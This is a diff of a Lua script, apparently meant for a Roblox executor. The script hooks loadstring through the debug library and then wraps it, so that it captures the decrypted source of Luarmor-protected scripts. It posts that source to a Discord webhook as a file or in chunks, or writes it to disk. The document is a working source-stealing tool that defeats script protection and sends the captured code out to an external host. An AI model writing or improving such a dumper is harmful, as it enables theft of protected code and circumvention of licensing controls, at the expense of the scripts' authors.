@@ -1,5 +1,6 @@
 --[[
-  Capture source → Discord webhook only. Debug messages sent to same webhook.
+  Capture Luarmor source → Discord webhook (file attachment or save to folder).
+  Debug messages sent to same webhook.
 ]]
 
 local _K = "XEBGtoEqCvrdDyGxWPpcKrHYKGxvrijf"
@@ -13,7 +14,7 @@ local function _escape(s)
 	return tostring(s):gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r")
 end
 
--- Try executor HTTP first (Roblox HttpService often blocks Discord). Content max 2000 chars.
+-- Debug/text message to webhook. Content max 2000 chars.
 local function _post(content)
 	local body = "{\"content\":" .. ("%q"):format(_escape(tostring(content):sub(1, 2000))) .. "}"
 	pcall(function()
@@ -64,7 +65,7 @@ local function _send(s)
 	_n = _n + 1
 	(task and task.defer or spawn or function(f) f() end)(function()
 		pcall(function()
-			-- 1) Try single webhook with file attachment (all 155 "parts" in one message)
+			-- 1) Try single webhook with file attachment (full source in one message)
 			local sent = _sendAsFile(s)
 			if sent then
 				_post("[DEBUG] Sent full source as file attachment (" .. #s .. " chars)")
@@ -78,9 +79,9 @@ local function _send(s)
 				_post("[DEBUG] Saved to " .. path .. " (" .. #s .. " chars) - check executor folder")
 				return
 			end
-			-- 3) Last resort: send only first chunk so you get something
+			-- 3) Last resort: send only first chunk
 			local chunk = s:sub(1, _maxChunk)
-			local body = game and game.GetService and game:GetService("HttpService"):JSONEncode({
+			local body = game and game.GetService and game:GetService("HttpService") and game:GetService("HttpService"):JSONEncode({
 				content = ("Full source " .. #s .. " chars - file upload/save failed. First " .. _maxChunk .. " chars below:"),
 				embeds = { { description = "```lua\n" .. chunk .. "\n```" } }
 			}) or "{\"content\":\"Full source " .. #s .. " chars - check executor folder for writefile\"}"
@@ -97,7 +98,6 @@ local _useHook = _d and _d.sethook and _d.getinfo and _d.getlocal
 
 if _useHook then
 	_debug("Using debug hook (will remove after first loadstring so it doesn't freeze)")
-	-- Only hook for the FIRST loadstring call (the loader). Then remove hook and use wrapper so we don't freeze.
 	local _hookActive = true
 	_d.sethook(function(ev)
 		if ev ~= "call" or not _hookActive then return end
@@ -108,7 +108,6 @@ if _useHook then
 		_debug("loadstring called, len=" .. (type(src) == "string" and #src or 0) .. " – removing hook, using wrapper")
 		_hookActive = false
 		_d.sethook()
-		-- From now on use wrapper so next loadstring (decrypted) gets captured
 		loadstring = function(src2, name)
 			if type(src2) == "string" then _send(src2) end
 			return _real(src2, name)
